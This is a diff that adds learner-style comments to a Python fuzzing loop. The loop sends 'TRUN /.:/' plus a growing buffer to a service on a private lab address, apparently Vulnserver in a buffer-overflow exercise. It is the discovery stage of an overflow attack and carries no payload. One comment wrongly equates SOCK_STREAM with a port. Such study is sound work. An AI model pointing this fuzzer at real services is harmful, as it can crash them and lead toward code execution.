@@ -279,10 +279,17 @@ buffer = "A" * 100
 # While True, we will loop and try something:
 while True:
         try:
-                # test
+                # Try to connect to this socket:
+                    # socket.AF_INET = IPv4
+                    # socket.SOCK_STREAM = PORT
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 s.connect(('192.168.1.100', 9999))
                 
+                # Once we've connected, we will send a "TRUN" command:
+                    # We are using TRUN because we know is the vulnerable command in this case.
+                    # The registers /.:/ are the strings that the command needs to "understand" the command (those appear in the string of the Regs in Immunity Debugger)
+                    # + buffer: We are adding the buffer variable "A * 100", so...
+                        # WE ARE SENDING: TRUN/.:/ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                 s.send(('TRUN /.:/' + buffer))
                 s.close()
                 sleep(1)
